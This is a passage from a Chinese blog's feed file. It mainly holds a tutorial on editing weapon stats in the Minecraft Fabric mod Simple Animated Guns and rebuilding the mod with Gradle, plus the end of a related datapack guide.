anim_guns</span><br><span class="line">│                               └── 📁 recipes</span><br><span class="line">│                                   ├── 📄 sight_holo.json</span><br><span class="line">│                                   ├── 📄 grip_foregrip.json</span><br><span class="line">│                                   └── 📄 muzzle_mbrake.json</span><br></pre></td></tr></tbody></table></figure><p>之后进入相对应的游戏存档中，享受游戏吧。</p><p>如果你并未关闭游戏而是实时地增加数据包，你可能需要使用 <code>/reload</code> 命令来重载数据包，使其生效。</p><p>如果你想检查数据包是否被读取，可以使用下面的命令：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/datapack list</span><br></pre></td></tr></tbody></table></figure><p>成功示例：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506022128098.png" alt="image-20250602212831033"></p><h3 id="配件安装拆卸"><a class="markdownIt-Anchor" href="#配件安装拆卸"></a> 配件安装 / 拆卸</h3><p>配件安装其实很简单，将你拥有的配件使用鼠标右键应用到适配的枪上即可；配件拆卸也是如此，只需使用鼠标右键点击装备了配件的枪械即可将配件一件件拆卸下来。例如：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506012341304.gif" alt="S.A.G1"></p><h2 id="枪械零件制作"><a class="markdownIt-Anchor" href="#枪械零件制作"></a> 枪械零件制作</h2><p>枪械零件、蓝图的制作方法不像配件那样困难，因为作者已经写好了每一个合成 / 熔炼配方。如果你不知道该如何合成，可以去学习如何使用 REI 或者其他物品管理器 mod。</p><p>该部分较为简单，基本是鼠标点点就知道合成 / 熔炼方法，故不再详细介绍。</p><h2 id="相关链接"><a class="markdownIt-Anchor" href="#相关链接"></a> 相关链接</h2><ul><li><a href="https://www.mcmod.cn/class/1674.html">【MC 百科】REI 物品管理器</a></li></ul><h2 id="声明"><a class="markdownIt-Anchor" href="#声明"></a> 声明</h2><p>因为原作者并未在 GitHub 上声明任何一种开源协议，故在此我并不会提供制作的数据包，而只是将这种解决办法以本篇文字教程的形式提供给大家，以尊重原作者的劳动成果，希望大家玩的开心。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Minecraft </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Minecraft </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Simple Animated Guns 枪械属性修改</title>
      <link href="/posts/64665.html"/>
      <url>/posts/64665.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><blockquote><p>环境：Windows11、Java"17.0.11" 2024-04-16 LTS 64-Bit、PCL2 或其他启动器</p><p>工具：Vscode</p></blockquote><h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>本文是对该 mod 进行枪械属性修改，如果你需要这个 mod 的<strong>游玩指南或者教程</strong>，欢迎你阅读我写的文章：【<a href="https://4rozen.github.io/archives/Gamer/63649.html">Simple Animated Guns 游玩指南 / 教程</a>】</p><h2 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h2><p>省略我半小时的翻看源代码的心路历程，我们直入正题吧… 本文并不复杂，只要不是纯小白，都可一战</p><p>在此之前你需要准备的是：</p><ol><li>原 mod 项目</li><li>一个能用的编辑器，如 Vscode、Sublime</li><li>Java17 环境</li></ol><h2 id="clone-或下载原作者项目"><a class="markdownIt-Anchor" href="#clone-或下载原作者项目"></a> Clone 或下载原作者项目</h2><blockquote><p>原作者项目地址：<a href="https://github.com/elidhan/Simple-Animated-Guns/tree/1.20.1">Simple-Animated-Guns</a></p><p>由于没有官方修改枪械属性的相关教程，所以我的思路是通过开源的源工程文件进行代码审计，修改好属性后将其编译成一个我们的自定义版本。本文仅供学习参考。</p><p>赞美原作者！！！Fabric 的枪械 mod 真的很少！</p></blockquote><p>进行以下的步骤前，请先确认你操作的分支是否为你需要的分支：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721236869939.png" alt="QQ_1721236869939"></p><p>比如我玩的 BetterMC 是 1.20.1 的，所以我就选择了对应的版本。然后我们需要把原作者的项目搞到本地来，因为我们要进行修改嘛。这里不论是 Git clone 还是下载成压缩包都是需要一定 “本事” 的，有能力的可以自行下载到本地，我这里直接提供蓝奏云的下载链接在文末，请自行下载需要的版本分支项目。</p><h2 id="准备好编辑器"><a class="markdownIt-Anchor" href="#准备好编辑器"></a> 准备好编辑器</h2><p>我推荐使用微软的 vsocde 作为编辑器，这个编辑器在微软商店就能下载到：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721237162354.png" alt="QQ_1721237162354"></p><p>当然你也可以使用你习惯的编辑器，Sublime Text 啥的都可以。如果你的 Vscode 是英文的不习惯，可以自行搜索 Vscode 汉化，或者参考下面的文章：</p><ul><li><a href="https://blog.csdn.net/danshiming/article/details/132110419">Vscode 设置中文</a></li><li><a href="https://blog.csdn.net/qq_45565693/article/details/128421869">Vscode 安装汉化插件不生效</a></li></ul><h2 id="准备好-java-环境"><a class="markdownIt-Anchor" href="#准备好-java-环境"></a> 准备好 Java 环境</h2><p>如果你下载好了项目文件，请将其解压。然后咱们来检查目录中是否存在 <code>build.gradle</code> 文件，如果没有请重新下载，不出意外是有的。项目目录应该如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721238704344.png" alt="QQ_1721238704344"></p><p>请使用我们准备好的 Vscode 将其打开，不出意外你会得到：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721239112188.png" alt="QQ_1721239112188"></p><p>可以看到这里要求的 Java 版本。请按要求切换本地 Java 版本环境，也就是转到系统环境变量进行调整。如果你忘记本地 Java 版本，请使用命令行执行查看版本命令，查看本地 Java 版本的命令是：</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></tbody></table></figure><p>Win+R 就可以打开运行，然后输入 cmd 就可以打开一个命令行了。</p><p>上述命令需要你配置好 Java 环境变量。如果出现版本号且版本对得上，就说明你的 Java 环境是 ok 的；如果你从未安装过 Java 只是在使用启动器时有所耳闻，<strong>可以参考下面的文章来安装并配置 Java 环境变量</strong>（文末我会提供 Java17 版本 123 云盘链接，蓝奏云限制 100m 大小没办法）。</p><p>环境变量的作用就是能让你在命令行内直接使用 java 命令，而不是必须得在 java.exe 目录下才能使用 java 命令</p><ul><li><a href="https://blog.csdn.net/godot06/article/details/104378253">Java 基础 1 - 环境篇：JDK 安装与环境变量配置</a></li></ul><p>如果你使用我提供的 Java17 安装包，也请看一看上面的这篇文章，直接跳到 <code>1-2安装</code>步骤即可，或者自行搜索可信的教程文章也是可以的。</p><p>上述文章在环境变量配置中，关键字符串如下（分号是变量值最后如果没有分号才需要加）</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;</span><br></pre></td></tr></tbody></table></figure><p>如果你的 PATH 变量不是文章中的样式，而是和我一样是列表，那就简单得多了直接点右边的新建就可以：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721243505134.png" alt="QQ_1721243505134"></p><p>好了，如果不出意外你已经可以通过 cmd（Win+R 输入 cmd 即可）执行 java 命令了。如果你忘记 Java 在哪，可以使用下面的命令</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">where</span> java</span><br></pre></td></tr></tbody></table></figure><h2 id="解析-simple-animated-guns-枪械属性"><a class="markdownIt-Anchor" href="#解析-simple-animated-guns-枪械属性"></a> 解析 - Simple Animated Guns 枪械属性</h2><p>请使用我们准备好的 Vscode 编辑器打开项目</p><p>如果你安装时选择了将 Vscode 添加到右键菜单，则可以直接在项目目录空白处直接右键将其作为项目打开：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721244782340.png" alt="QQ_1721244782340"></p><p>你的右键菜单可能和我不一样，因为我嫌它安装时给我的字太长了不好看，所以改成了 <code>Open as Project</code></p><p>如果你没有，那么你可以直接打开 Vscode，在左上角点击文件 -&gt; 打开文件夹，然后找到项目文件夹就好了</p><p>打开后，你会得到一个相对简洁的界面：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721245065074.png" alt="QQ_1721245065074"></p><p>鼠标左键点击箭头指向的图标就可以看到我们的工程项目文件目录了。</p><p>Ok，我们先来看看总览性的东西吧。</p><p>我们找到：<code>src\main\resources\assets\anim_guns\lang\en_us.json</code> 的这个 en_us.json 文件</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721245291655.png" alt="QQ_1721245291655"></p><p>这个就是作者定义的全部相关东西了。值得一提的是，在原地址的 default 分支，也就是 1.18.2v1-test-arms-weaponmods 分支中，几乎相同的位置下是存在官方汉化的：</p><p>地址：<a href="https://github.com/elidhan/Simple-Animated-Guns/tree/1.18.2v1-test-arms-weaponmods/src/main/resources/assets/anim_guns/lang">https://github.com/elidhan/Simple-Animated-Guns/tree/1.18.2v1-test-arms-weaponmods/src/main/resources/assets/anim_guns/lang</a></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721245438657.png" alt="QQ_1721245438657"></p><p>不过版本更迭，现在 1.20.1 并没有这份官方汉化 json 文件了，我个人简单翻译了一下，在 1.20.1 版本的同目录下创建了一份 zh_cn.json 文件，以供大家参考。</p><p>个人力量有限，出错在所难免，如遇到请见谅。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721245633177.png" alt="QQ_1721245633177"></p><p>有了这份总览，心中总算也是踏实许多。</p><p>接下来我们找到：<code>src\main\java\net\elidhan\anim_guns\item\ModItems.java</code></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721245988951.png" alt="QQ_1721245988951"></p><p>下面就是我找到 GunItem.java 中的构造函数后进行对照再为大家进行注释解释后的代码了，我这里仅用第一个枪械做例子。</p><p><s>因为其他的枪械是大差不差的，除了开火模式全自动半自动的差别、装填方式、持枪方式、可装备的附件类型外，基本差不多？。</s></p><h3 id="属性值一览"><a class="markdownIt-Anchor" href="#属性值一览"></a> 属性值一览</h3><p>1.20.1 版本分支构造函数如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">GunItem</span><span class="params">(Settings settings, String gunID, String animationID,</span></span><br><span class="line"><span class="params">                   <span class="type">float</span> gunDamage, <span class="type">int</span> rateOfFire, <span class="type">int</span> magSize,</span></span><br><span class="line"><span class="params">                   Item ammoType, <span class="type">int</span> reloadCooldown, <span class="type">float</span>[] bulletSpread,</span></span><br><span class="line"><span class="params">                   <span class="type">float</span>[] gunRecoil, <span class="type">int</span> pelletCount, LoadingType loadingType,</span></span><br><span class="line"><span class="params">                   SoundEvent reloadSoundStart, SoundEvent reloadSoundMagOut,</span></span><br><span class="line"><span class="params">                   SoundEvent reloadSoundMagIn, SoundEvent reloadSoundEnd,</span></span><br><span class="line"><span class="params">                   SoundEvent shootSound, SoundEvent postShootSound, <span class="type">int</span> reloadCycles,</span></span><br><span class="line"><span class="params">                   <span class="type">boolean</span> isScoped, <span class="type">boolean</span> unscopeAfterShot,</span></span><br><span class="line"><span class="params">                   <span class="type">int</span> reloadStage1, <span class="type">int</span> reloadStage2, <span class="type">int</span> reloadStage3, FiringType firingType,</span></span><br><span class="line"><span class="params">                   ArmType armType, AttachmentItem.AttachType[] acceptedAttachmentTypes)</span></span><br><span class="line">    {</span><br><span class="line">        … 实现部分略 …</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>主要还是看构造函数中的参数要求，实现部分的赋值倒是可以忽略。</p><p>下面这个是 1.20.1 版本分支的枪械属性注册</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以下为枪械注册属性信息</span></span><br><span class="line">    <span class="comment">// pistol_light为手枪</span></span><br><span class="line">    <span class="comment">// 所有枪械id可在src\main\resources\assets\anim_guns\lang\zh_cn.json中找到，zh_cn.json为本人简单翻译，仅供参考</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Item</span> <span class="variable">PISTOL</span> <span class="operator">=</span> registerItem(<span class="string">"pistol_light"</span>, <span class="keyword">new</span> <span class="title class_">GunItem</span>(<span class="keyword">new</span> <span class="title class_">FabricItemSettings</span>().maxCount(<span class="number">1</span>),</span><br><span class="line"><span class="comment">// 以下属性值仅作参考示例，参数类型在src\main\java\net\elidhan\anim_guns\item\GunItem.java中的构造方法GunItem已写明，可自行理解</span></span><br><span class="line">           <span class="string">"pistol_light"</span>, <span class="comment">// 枪械id，请勿修改</span></span><br><span class="line"><span class="string">"pistol_generic"</span>, <span class="comment">// 动画id，请勿修改</span></span><br><span class="line"><span class="number">5</span>, <span class="comment">// 伤害值</span></span><br><span class="line"><span class="number">3</span>, <span class="comment">// 射速</span></span><br><span class="line"><span class="number">17</span>, <span class="comment">// 弹匣容量</span></span><br><span class="line">STANDARD_HANDGUN_BULLET, <span class="comment">// 弹药类型</span></span><br><span class="line"><span class="number">35</span>, <span class="comment">// 重新装填的持续时间，单位为ticks，Minecraft的ticks是1/20秒(s)，也就是50毫秒(ms)</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">float</span>[] {<span class="number">1.5f</span>, <span class="number">1.5f</span>}, <span class="comment">// 子弹偏移/散布范围</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">float</span>[] {<span class="number">1f</span>, <span class="number">2.5f</span>},  <span class="comment">// 后坐力</span></span><br><span class="line"><span class="number">1</span>, <span class="comment">// 每次击发的子弹数，主要跟枪械开火模式有关，单发、连发之类的</span></span><br><span class="line">GunItem.LoadingType.MAGAZINE, <span class="comment">// 装填方式，这里是弹匣装填</span></span><br><span class="line"><span class="literal">null</span>, <span class="comment">// 重新装填开始时的音效，此处为null</span></span><br><span class="line">ModSounds.RELOAD_GENERIC_PISTOL_P1, <span class="comment">// 装填时，将弹匣拔出的音效</span></span><br><span class="line">ModSounds.RELOAD_GENERIC_PISTOL_P2, <span class="comment">// 装填时，将新弹匣放入的音效</span></span><br><span class="line">ModSounds.RELOAD_GENERIC_PISTOL_P3, <span class="comment">// 装填完毕音效</span></span><br><span class="line">ModSounds.PISTOL_LIGHT, <span class="comment">// 子弹击发音效</span></span><br><span class="line"><span class="literal">null</span>, <span class="comment">// 射击后的音效，如子弹落地音、枪声回响音等，此处为null</span></span><br><span class="line"><span class="number">1</span>, <span class="comment">// 重新装填涉及的所有步骤的循环次数，这里为1，表示所有步骤仅做一次</span></span><br><span class="line"><span class="literal">false</span>, <span class="comment">// 是否具有瞄准镜</span></span><br><span class="line"><span class="literal">false</span>, <span class="comment">// 射击后是否取消瞄准状态</span></span><br><span class="line"><span class="number">9</span>, <span class="comment">// 下面三个数字都是重新装填子弹的步骤持续时间</span></span><br><span class="line"><span class="number">10</span>,</span><br><span class="line"><span class="number">20</span>,</span><br><span class="line">GunItem.FiringType.SEMI_AUTO, <span class="comment">// 射击方式，这里是半自动模式</span></span><br><span class="line">GunItem.ArmType.HANDGUN_TWOHAND, <span class="comment">// 装备或持枪方式，这里是双手持枪</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">AttachmentItem</span>.AttachType[]{AttachmentItem.AttachType.MUZZLE}) <span class="comment">// 可装备的附件类型，这里只有一个MUZZLE（枪口），也可以在json文件查看</span></span><br><span class="line">{</span><br><span class="line">} <span class="comment">// 这里还提供了一个匿名内部类，可自定义</span></span><br><span class="line">    );</span><br></pre></td></tr></tbody></table></figure><p>下面这个则是 1.18.2v1-test-arms-weaponmods 版本分支的</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">// 将sniper_classice狙击步枪进行注册，CLASSIC_SNIPER_RIFLE为注册后的静态名称，主要咱们看GunItem的参数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Item</span> <span class="variable">CLASSIC_SNIPER_RIFLE</span> <span class="operator">=</span> registerItem(<span class="string">"sniper_classic"</span>, <span class="keyword">new</span> <span class="title class_">GunItem</span>(<span class="keyword">new</span> <span class="title class_">FabricItemSettings</span>().group(AnimatedGuns.GUNS).maxCount(<span class="number">1</span>), <span class="comment">//使用FabricItemSettings设置物品的显示效果</span></span><br><span class="line"><span class="string">"sniper_classic"</span>, <span class="comment">// 枪的ID名，请勿修改</span></span><br><span class="line"><span class="string">"sniper_classic"</span>, <span class="comment">// 枪的名称，请勿修改</span></span><br><span class="line">       <span class="number">29</span>, <span class="comment">// 枪的伤害值</span></span><br><span class="line">       <span class="number">20</span>, <span class="comment">// 枪的射速</span></span><br><span class="line">       <span class="number">5</span>, <span class="comment">// 枪的弹匣弹药容量</span></span><br><span class="line">       HEAVY_RIFLE_BULLET, <span class="comment">// 枪的子弹类型</span></span><br><span class="line">       <span class="number">36</span>, <span class="comment">// 子弹装填时间，单位为ticks，Minecraft的ticks是1/20秒(s)，也就是50毫秒(ms)</span></span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">float</span>[] {<span class="number">0.125f</span>, <span class="number">0.125f</span>}, <span class="comment">// 子弹散布/扩散范围</span></span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">float</span>[]{<span class="number">2.5f</span>, <span class="number">8.25f</span>}, <span class="comment">// 后坐力</span></span><br><span class="line">       <span class="number">1</span>, <span class="comment">// 每次击发的子弹数，主要跟枪械开火模式有关，全自动和连发之类的</span></span><br><span class="line">GunItem.LoadingType.PER_CARTRIDGE, <span class="comment">// 子弹装填方式，这里是击发一发后就装填一发</span></span><br><span class="line"><span class="literal">null</span>, <span class="comment">// 装填开始时的音效</span></span><br><span class="line">ModSounds.RELOAD_GENERIC_SNIPER_P1, <span class="comment">// 装填过程中弹匣拔出音</span></span><br><span class="line">ModSounds.RELOAD_CLASSIC_SNIPER_P2, <span class="comment">// 装填过程中的新的弹匣装填音</span></span><br><span class="line">ModSounds.RELOAD_GENERIC_SNIPER_P3, <span class="comment">// 装填结束时的音效</span></span><br><span class="line">       ModSounds.SNIPER_CLASSIC, <span class="comment">// 子弹击发声音</span></span><br><span class="line">       <span class="number">5</span>, <span class="comment">// 重新装填弹匣的预期子弹数</span></span><br><span class="line">       <span class="literal">true</span>, <span class="comment">// 是否具有瞄准镜</span></span><br><span class="line"> <span class="literal">true</span>, <span class="comment">// 是否在射击后取消瞄准效果</span></span><br><span class="line">       <span class="number">12</span>, <span class="comment">// 下面都是重新装填子弹的各个阶段的持续时间</span></span><br><span class="line">       <span class="number">13</span>,</span><br><span class="line">       <span class="number">24</span>)</span><br><span class="line">       <span class="comment">// 后面还有个{}，是一个匿名内部类，此处为空，但是可以在里面添加自定义的方法或覆盖父类的方法</span></span><br><span class="line">{</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p>当然旧版本会少对应的属性参数，而新版本的 1.20.1 则是增加了持枪动作类型和枪口等附件的支持的。</p><h3 id="构造函数解析"><a class="markdownIt-Anchor" href="#构造函数解析"></a> 构造函数解析</h3><p>GunItem 构造函数的具体参数要求如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721381736298.png" alt="1721381736298"></p><p>上面的构造函数参数类型要求请千万做到心中明确。</p><p>如果你学过 Java 或者其他编程语言，这部分你可以跳过，但是也请稍微留意一下参数类型要求。<s>否则修改一时爽，编译（）</s></p><p>好了，收回删除线伏笔，这些枪械可能存在的差异，如：全自动半自动的、装填方式、持枪方式等。我也给大家进行注释解释了，就在：<code>src\main\java\net\elidhan\anim_guns\item\GunItem.java</code> 的 826 行开始：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721247100101.png" alt="QQ_1721247100101"></p><p>这些都是枚举类型的，大家可以自行对应理解。而可装备的附件类型其实就在枪械的上面，或者说，在 json 文件中也能知道，好像就 3 种？：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721247279794.png" alt="QQ_1721247279794">zh_cn.json63 行处：</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">"item.anim_guns.sight_holo"</span><span class="punctuation">:</span>  <span class="string">"全息瞄准镜"</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">"item.anim_guns.grip_foregrip"</span><span class="punctuation">:</span>  <span class="string">"前握把"</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">"item.anim_guns.muzzle_mbrake"</span><span class="punctuation">:</span>  <span class="string">"枪口制动器"</span><span class="punctuation">,</span></span><br></pre></td></tr></tbody></table></figure><h2 id="实践-属性修改"><a class="markdownIt-Anchor" href="#实践-属性修改"></a> 实践 - 属性修改</h2><p>Ok，现在大家都有了基本认识，我们来简单修改一个 amr_classic 狙击枪的伤害值吧。</p><p>我们找到：<code>src\main\java\net\elidhan\anim_guns\item\ModItems.java</code> 的 689 行开始</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721248383896.png" alt="QQ_1721248383896"></p><p>我们简单修改原伤害值 40 为 50</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721248484232.png" alt="QQ_1721248484232"></p><p>Ok，这里我们的修改完成后，我们基本上就要进行编译了。不过在编译之前，我们先来添加一下国内镜像的仓库源，以防等会编译过程中可能出现的下载慢的情况。</p><p>我们打开 <code>build.gradle</code> 文件</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721248808489.png" alt="QQ_1721248808489"></p><p>添加一个阿里云的 maven 地址：</p><figure class="highlight groovy"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">maven{ url<span class="string">'https://maven.aliyun.com/nexus/content/groups/public/'</span>}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721248879550.png" alt="QQ_1721248879550"></p><p>好的，我们做完修改之后，点击左上角的文件 -&gt; 全部保存。将我们做的修改保存下来，不然是不会生效的。</p><h2 id="实践-编译"><a class="markdownIt-Anchor" href="#实践-编译"></a> 实践 - 编译</h2><p>别关闭 Vscode 哦，我们直接在打开项目的 Vscode 上点击它上方导航栏的终端选项，<strong>新建一个终端</strong>用来运行我们要执行的命令：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721249073586.png" alt="QQ_1721249073586"></p><p>由于项目自带 gradlew 和 gradlew.bat，所以我们可以不用安装 gradle，我们直接使用它们来编译，执行命令为：</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\gradlew build</span><br></pre></td></tr></tbody></table></figure><p>如果出现绿字 BUILD SUCCESSFUL in 基本上是没问题的：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721249741382.png" alt="QQ_1721249741382"></p><p>编译后的文件在：Simple-Animated-Guns-1.20.1\build\libs 中</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721249787069.png" alt="QQ_1721249787069"></p><p>不出意外的话，使用上面这个不带 sources 的 jar 包就可以了。</p><h2 id="实践-替换-jar-包测试"><a class="markdownIt-Anchor" href="#实践-替换-jar-包测试"></a> 实践 - 替换 jar 包测试</h2><p>打开 PCL2，将 jar 包替换（请备份原文件）</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721249892892.png" alt="QQ_1721249892892"></p><p>这里我将原来我正常使用的 jar 包剪切出去，放在了编译后的目录下统一管理，接下来将我们编译的 jar 放回进行测试：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721249976750.png" alt="QQ_1721249976750"></p><p>替换之后，可以看到 PCL2 可以搜到我们替换的 jar 包</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721250119387.png" alt="QQ_1721250119387"></p><p>接下来就是进游戏测试了：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/2024-07-18_05.07.31.png" alt="2024-07-18_05.07.31"></p><p>可以看到 Damage 伤害变成了我们修改后的 50，成功！</p><h2 id="准星修改"><a class="markdownIt-Anchor" href="#准星修改"></a> 准星修改</h2><p>本来到这里也该结束了，但是再稍微提一嘴准星的问题吧。</p><p>因为我是玩的 BetterMC1.20.1，玩过的朋友可能知道，它这个整合包的准星不是传统派的十字，而是十字左右套了个左右括号包裹起来，我是很难习惯，所以我就把它改回了传统的十字准星，这个改法在 BetterMC 的 MC 百科词条下的评论区我发了办法，感兴趣的可以看看：<a href="https://www.mcmod.cn/modpack/205.html">BetterMC 修改准星 489 楼评论</a></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721252012398.png" alt="QQ_1721252012398"></p><h2 id="相关链接"><a class="markdownIt-Anchor" href="#相关链接"></a> 相关链接</h2><ul><li><p><a href="https://www.123pan.com/s/jqMxjv-rnGQv.html%E6%8F%90%E5%8F%96%E7%A0%81:Java">Java17 下载 - 提取码 Java</a></p></li><li><p><a href="https://wwf.lanzouj.com/b00pzoayid">原作者全版本源码 - 密码:h47e</a></p></li><li><p><a href="https://code.visualstudio.com/">Vscode 官网下载地址</a></p></li></ul><h2 id="勘误补充"><a class="markdownIt-Anchor" href="#勘误补充"></a> 勘误 &amp; 补充</h2><p>2024 年 7 月 18 日 21:54 勘误，补上原作者全版本源码链接。</p><p>2024 年 7 月 19 日 11:43 补充，在属性值部分补充关于构造函数的参数要求。</p><h2 id="可能遇到的问题"><a class="markdownIt-Anchor" href="#可能遇到的问题"></a> 可能遇到的问题</h2><ul><li>编译的时候显示：<code>Exception in thread "main" javax.net.ssl.SSLHandshakeException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target</code></li></ul><p>请检查是否开启了系统代理。关闭后再尝试编译。</p><ul><li>编译时报错： 不兼容的类型：从 double 转换到 float 可能会有损失 &amp; 错误：找不到符号 &amp; 构造器 (FabricItemSettings,String,String,double,int,int,Item,int,float [],float [],int,LoadingType,&lt; 空值 &gt;,SoundEvent,SoundEvent,SoundEvent,SoundEvent,&lt; 空值 &gt;,int,boolean,boolean,int,int,int,FiringType,ArmType,AttachType [])</li></ul><p>请检查属性值是否符合参数要求，如：9.5 默认为 double 类型，而构造函数要求为 float。请改为 9.5f 或 9.5F</p><ul><li><p>使用 gradlew 编译时提示：<code>gradlew : 无法将“gradlew”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写，如果包括路径，请确保路径正确，然后再试一次。</code></p><p>请检查 gradlew 是否在当前终端读取到的目录下，换言之，请检查终端当前的目录下有没有 <code>gradlew.bat</code> 或者 <code>gradlew</code> 这个文件，否则无法执行命令。</p></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Minecraft </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Minecraft </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React18 学习笔记 (未完成)</title>
      <link href="/posts/36922.html"/>
      <url>/posts/36922.html</url>
      
